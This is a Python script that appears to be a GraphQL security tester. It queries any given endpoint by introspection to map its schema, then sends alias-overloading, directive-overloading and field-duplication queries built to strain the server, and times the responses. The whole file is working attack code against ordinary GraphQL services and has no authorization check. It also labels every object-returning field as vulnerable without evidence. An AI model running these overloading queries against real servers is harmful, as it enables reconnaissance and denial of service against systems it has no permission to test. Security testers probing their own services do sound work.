#!/usr/bin/env python3

import requests
import json
import sys
import time
from typing import Dict, Optional, List, Tuple

class GraphQLVulnerabilityTester:
    def __init__(self, url: str):
        self.url = url
        self.headers = {
            'Content-Type': 'application/json',
            'x-apollo-operation-name': 'IntrospectionQuery',
            'apollo-require-preflight': 'true'
        }
        self.testable_fields = []
        
    def test_introspection(self) -> bool:
        """
        Test if introspection is enabled and return testable fields.
        Returns: bool indicating if introspection is enabled
        """
        introspection_query = """
        query IntrospectionQuery {\n    __schema {\n        queryType {\n            name\n        }\n        mutationType {\n            name\n        }\n        subscriptionType {\n            name\n        }\n        types {\n            ...FullType\n        }\n        directives {\n            name\n            description\n            locations\n            args {\n                ...InputValue\n            }\n        }\n    }\n}\n\nfragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n        name\n        description\n        args {\n            ...InputValue\n        }\n        type {\n            ...TypeRef\n        }\n        isDeprecated\n        deprecationReason\n    }\n    inputFields {\n        ...InputValue\n    }\n    interfaces {\n        ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n        name\n        description\n        isDeprecated\n        deprecationReason\n    }\n    possibleTypes {\n        ...TypeRef\n    }\n}\n\nfragment InputValue on __InputValue {\n    name\n    description\n    type {\n        ...TypeRef\n    }\n    defaultValue\n}\n\nfragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n        kind\n        name\n        ofType {\n            kind\n            name\n            ofType {\n                kind\n                name\n            }\n        }\n    }\n}
        """
        
        payload = {
            'query': introspection_query,
            'operationName': 'IntrospectionQuery'
        }
        
        try:
            response = requests.post(self.url, json=payload, headers=self.headers)
            result = response.json()
            
            if 'data' in result and '__schema' in result['data']:
                print("\n✅ Introspection is ENABLED!")
                self._analyze_schema(result['data']['__schema'])
                return True
                
            print("\n❌ Introspection appears to be DISABLED")
            return False
            
        except Exception as e:
            print(f"\n❌ Error testing introspection: {str(e)}")
            return False

    def _analyze_schema(self, schema: Dict) -> None:
        """Analyze schema to find testable fields"""
        testable_types = []
        
        for type_info in schema['types']:
            # Skip internal types
            if type_info['name'].startswith('__'):
                continue
                
            if type_info.get('fields'):
                for field in type_info['fields']:
                    field_type = field.get('type', {})
                    
                    # Check if field returns an object or list type
                    is_object = (
                        field_type.get('kind') in ['OBJECT', 'LIST'] or
                        (field_type.get('ofType', {}) or {}).get('kind') in ['OBJECT', 'LIST']
                    )
                    
                    if is_object:
                        self.testable_fields.append({
                            'type_name': type_info['name'],
                            'field_name': field['name']
                        })

        print("\nTestable Fields Found:")
        print("=====================")
        for field in self.testable_fields:
            print(f"Type: {field['type_name']}, Field: {field['field_name']}")
            print("Vulnerable to:")
            print("- Alias Overloading")
            print("- Directive Overloading")
            print("- Field Duplication")
            print("---")

    def _send_query(self, query: str) -> tuple:
        """Send a GraphQL query and measure response time"""
        payload = {
            'query': query,
            'operationName': None
        }
        
        try:
            start_time = time.time()
            response = requests.post(self.url, json=payload, headers=self.headers)
            end_time = time.time()
            response_time = end_time - start_time
            
            try:
                result = response.json()
                return result, response_time, None
            except json.JSONDecodeError:
                return None, response_time, f"Invalid JSON response: {response.text}"
                
        except requests.exceptions.RequestException as e:
            return None, 0, f"Request error: {str(e)}"

    def test_overloading_attacks(self, field_info: Dict, num_iterations: int = 100) -> None:
        """Test all overloading attacks for a specific field"""
        type_name = field_info['type_name']
        field_name = field_info['field_name']
        
        print(f"\nTesting field: {type_name}.{field_name}")
        print("=" * 40)
        
        # Test alias overloading
        self._test_alias_overloading(field_name, num_iterations)
        
        # Test directive overloading
        self._test_directive_overloading(field_name, num_iterations)
        
        # Test field duplication
        self._test_field_duplication(field_name, num_iterations)

    def _test_alias_overloading(self, field_name: str, num_aliases: int) -> None:
        """Test alias overloading"""
        print("\nTesting Alias Overloading...")
        alias_parts = [f"alias_{i}: {field_name} {{ id name }}" for i in range(num_aliases)]
        query = "query {" + " ".join(alias_parts) + "}"
        
        result, response_time, error = self._send_query(query)
        print(f"Response time: {response_time:.2f}s")
        if error or (result and result.get('errors')):
            print("Errors detected - possible protection in place")

    def _test_directive_overloading(self, field_name: str, num_directives: int) -> None:
        """Test directive overloading"""
        print("\nTesting Directive Overloading...")
        directives = " ".join(["@include(if: true)" for _ in range(num_directives)])
        query = f"query {{ {field_name} {directives} {{ id name }} }}"
        
        result, response_time, error = self._send_query(query)
        print(f"Response time: {response_time:.2f}s")
        if error or (result and result.get('errors')):
            print("Errors detected - possible protection in place")

    def _test_field_duplication(self, field_name: str, num_duplicates: int) -> None:
        """Test field duplication"""
        print("\nTesting Field Duplication...")
        duplicated_fields = " ".join(["id name" for _ in range(num_duplicates)])
        query = f"query {{ {field_name} {{ {duplicated_fields} }} }}"
        
        result, response_time, error = self._send_query(query)
        print(f"Response time: {response_time:.2f}s")
        if error or (result and result.get('errors')):
            print("Errors detected - possible protection in place")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <graphql-endpoint-url> [num_iterations]")
        sys.exit(1)
    
    url = sys.argv[1]
    num_iterations = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    
    print(f"Testing GraphQL endpoint: {url}")
    tester = GraphQLVulnerabilityTester(url)
    
    # First test introspection
    if tester.test_introspection():
        print("\nStarting vulnerability tests...")
        # Test each field found through introspection
        for field_info in tester.testable_fields:
            tester.test_overloading_attacks(field_info, num_iterations)
    else:
        print("\nCannot proceed with testing - introspection is disabled")

if __name__ == "__main__":
    main()
